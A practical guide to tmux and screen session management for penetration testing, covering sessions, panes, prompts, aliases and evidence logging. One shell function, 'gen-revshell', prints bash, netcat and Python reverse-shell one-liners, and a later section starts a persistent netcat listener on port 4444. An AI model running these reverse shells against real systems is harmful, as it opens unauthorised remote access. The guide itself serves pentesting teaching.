# Terminal Session Management Guide

> Skill: terminal-ops | Type: practical
> Created: 2026-05-23 | Estimated Study Time: 30 minutes

## Overview

Learn to manage complex terminal sessions for penetration testing workflows. Covers tmux/screen for persistence, shell customization, session sharing, and multi-target operations.

## Prerequisites

- Basic shell (bash/zsh)
- tmux or screen installed
- Understanding of shell processes

## 1. Tmux Session Management

### Basic Session Operations

```bash
# Start new session
tmux new -s pentest

# List sessions
tmux ls

# Attach to existing session
tmux attach -t pentest

# Detach from session (Ctrl+b, d)

# Kill session
tmux kill-session -t pentest

# Rename session
tmux rename-session -t old-name new-name
```

### Window Management

```bash
# New window in current session
tmux new-window -n "recon"

# List windows
tmux lsw

# Switch to window by number
tmux select-window -t 1

# Rename window
tmux rename-window -t 1 "scanning"

# Close window
tmux kill-window -t 1
```

### Pane Management

```bash
# Split vertically
tmux split-window -v

# Split horizontally
tmux split-window -h

# Switch between panes
tmux select-pane -[L,R,U,D]

# Close pane
tmux kill-pane -t 1

# Rotate panes
tmux rotate-window
```

### Persistent Sessions

```bash
# Create persistent session that survives SSH disconnect
tmux new -s persistent-pentest -d

# Run long-running commands
tmux send-keys -t persistent-pentest:1 "nmap -sS 192.168.1.0/24" C-m

# Check progress from any connection
tmux attach -t persistent-pentest

# Detach and leave running
# Ctrl+b, d
```

## 2. Screen Session Management

### Basic Operations

```bash
# Start new screen session
screen -S pentest

# Detach from session (Ctrl+a, d)

# List sessions
screen -ls

# Reattach to session
screen -r pentest

# Kill session
screen -X -S pentest quit
```

### Window Operations in Screen

```bash
# Create new window
# Ctrl+a, c

# List windows
# Ctrl+a, "

# Switch to window by number
# Ctrl+a, [0-9]

# Rename window
# Ctrl+a, A

# Kill window
# Ctrl+a, k
```

### Shared Sessions

```bash
# Start multi-user session
screen -S shared-pentest

# Enable multi-user mode (Ctrl+a, :multiuser on)
# Enable ACLs (Ctrl+a, :acladd user1)
# Grant permissions (Ctrl+a, :chacl user1 +rwx "#?")

# Second user connects
screen -x user1/shared-pentest
```

## 3. Shell Customization for Ops

### Custom PS1 Prompt

```bash
# Add to ~/.bashrc or ~/.zshrc
# Red prompt for root, green for user
if [ "$(id -u)" = "0" ]; then
    export PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
fi

# With timestamp
export PS1='[\D{%Y-%m-%d %H:%M:%S}] \u@\h:\w\$ '

# With git branch
parse_git_branch() {
    git branch 2>/dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ (\1)/'
}
export PS1='\u@\h:\w$(parse_git_branch)\$ '
```

### Aliases for Common Ops

```bash
# Add to ~/.bashrc or ~/.zshrc
alias ll='ls -laFh'
alias grep='grep --color=auto'
alias ports='netstat -tulpn'
alias connections='ss -tulpn'
alias myip='curl -s ifconfig.me'
alias localip='ip addr show | grep inet'
alias scan='nmap -sV'
alias ports-fast='nmap -F'
alias history-stats='history | awk "{CMD[\$2]++;count++;}END { for (a in CMD)print CMD[a] " " CMD[a]/count*100 "% " a;}" | grep -v "./" | column -c3 -s " " -t | sort -nr | nl | head -n10'

# Evidence logging aliases
alias logstart='script -e ~/pentest/evidence/session-$(date +%Y%m%d-%H%M%S).log'
alias logend='echo "=== SESSION END ===" && exit'
```

### Custom Shell Functions

```bash
# Add to ~/.bashrc or ~/.zshrc

# Quick port scan with evidence logging
scan-with-evidence() {
    local target=$1
    local logfile="~/pentest/evidence/scan-${target}-$(date +%Y%m%d-%H%M%S).log"
    echo "=== SCAN: $target at $(date) ===" | tee -a "$logfile"
    nmap -sV -p- "$target" | tee -a "$logfile"
    echo "=== SCAN COMPLETE ===" | tee -a "$logfile"
}

# Extract IP addresses from files
extract-ips() {
    grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' "$@"
}

# Find open ports in nmap output
find-open-ports() {
    grep -E "^[0-9]+/tcp.*open" "$@"
}

# Quick reverse shell generator
gen-revshell() {
    local ip=$1
    local port=$2
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "nc -e /bin/bash $ip $port"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
}
```

## 4. Multi-Target Session Pattern

### Tmux Layout for Pentesting

```bash
# Create organized pentest session
tmux new -s pentest -n "recon"

# Create additional windows
tmux new-window -n "targets"
tmux new-window -n "exploit"
tmux new-window -n "post"
tmux new-window -n "notes"

# In targets window, create panes for each target
tmux select-window -t targets
tmux split-window -v
tmux split-window -h
tmux select-pane -t 0
tmux split-window -h

# Now have 4 panes for different targets
# Pane 0: Target 1 (192.168.1.100)
# Pane 1: Target 2 (192.168.1.101)
# Pane 2: Target 3 (192.168.1.102)
# Pane 3: Target 4 (192.168.1.103)
```

### Quick-Switch Keybindings

```bash
# Add to ~/.tmux.conf
# Change prefix from Ctrl+b to Ctrl+a
unbind C-b
set-option -g prefix C-a
bind-key C-a send-prefix

# Quick window switching
bind-key 1 select-window -t 1
bind-key 2 select-window -t 2
bind-key 3 select-window -t 3
bind-key 4 select-window -t 4

# Quick pane switching
bind-key h select-pane -L
bind-key j select-pane -D
bind-key k select-pane -U
bind-key l select-pane -R

# Split with | and -
bind | split-window -h -c "#{pane_current_path}"
bind - split-window -v -c "#{pane_current_path}"
```

## 5. Evidence Logging Integration

### Auto-Logging Session Start

```bash
# Add to ~/.bashrc
pentest-start() {
    local session_name=${1:-"pentest-$(date +%Y%m%d-%H%M%S)"}
    local log_dir="~/pentest/evidence"

    mkdir -p "$log_dir"
    local log_file="$log_dir/session-$(date +%Y%m%d-%H%M%S).log"

    echo "=== SESSION START: $(date -u '+%Y-%m-%dT%H:%M:%SZ') ==="
    echo "Session: $session_name"
    echo "Log: $log_file"

    # Start tmux with logging
    tmux new -s "$session_name" "script -e $log_file"
}

pentest-start my-session
```

### Evidence Markers in Tmux

```bash
# Add these functions to your shell
evidence-marker() {
    local marker_type=$1
    local description=$2
    echo "=== $marker_type: $description ($(date)) ==="
}

# Usage in tmux pane
evidence-marker "ACTION" "Starting nmap scan of 192.168.1.100"
nmap -sV 192.168.1.100
evidence-marker "RESULT" "Found 3 open ports: 22, 80, 443"
```

## 6. Background Task Management

### Tmux for Background Tasks

```bash
# Start long-running scan in background
tmux new -d -s nmap-scan "nmap -sS -p- 192.168.1.0/24 > scan-results.txt"

# Check if still running
tmux has-session -t nmap-scan && echo "Still running" || echo "Complete"

# View progress
tmux attach -t nmap-scan

# Detach when done
# Ctrl+b, d

# Get results
cat scan-results.txt
```

### Screen for Persistent Processes

```bash
# Start persistent listener
screen -S listener -d -m bash -c 'while true; do nc -lvp 4444; done'

# Check listener status
screen -ls | grep listener

# Send command to screen
screen -S listener -p 0 -X stuff "echo 'listener active'\n"
```

## 7. Session Recovery and Persistence

### Save and Restore Tmux Sessions

```bash
# Install tmux-resurrect
# git clone https://github.com/tmux-plugins/tmux-resurrect ~/.tmux/plugins/tmux-resurrect

# Add to ~/.tmux.conf
run-shell ~/.tmux/plugins/tmux-resurrect/resurrect.tmux

# Save current session
# Ctrl+b, Ctrl+s

# Restore session
# Ctrl+b, Ctrl+r

# Auto-save/restore every 5 minutes
set -g @resurrect-capture-pane-contents 'on'
set -g status-right 'Save: #{?session_many_attached,#[fg=red],#[fg=green]}#{?@resurrect-save-command,Saving...,Saved}  Restore: #{?@resurrect-restore-command,Restoring...,Restored}'
```

### Screen Session Persistence

```bash
# Create screen with detach-on-close
screen -S persistent -D -m

# Reattach if exists, create if not
screen -R persistent

# Kill detached sessions older than 24h
screen -list | awk '/.*/{print $1}' | while read s; do
    screen -S "$s" -Q select . 2>/dev/null && \
        screen -S "$s" -X quit
done
```

## Quick Reference

```bash
# Tmux basics
tmux new -s session-name
tmux ls
tmux attach -t session-name
tmux kill-session -t session-name

# Tmux windows/panes
tmux new-window -n name
tmux split-window -h
tmux select-pane -[L,R,U,D]

# Screen basics
screen -S session-name
screen -ls
screen -r session-name

# Detach
# Tmux: Ctrl+b, d
# Screen: Ctrl+a, d

# Custom prompt
export PS1='[\D{%H:%M:%S}] \u@\h:\w\$ '

# Evidence logging
script -e session.log
echo "=== ACTION: description ==="

# Background tasks
tmux new -d -s task-name "long-command"
tmux attach -t task-name
```

## Integration with Other Skills

- **terminal-ops**: Evidence-first commands reference
- **verification-loop**: Session logs as verification output
- **chronicle**: Session markers as P0 events
- **network-pentest**: Multi-pane target management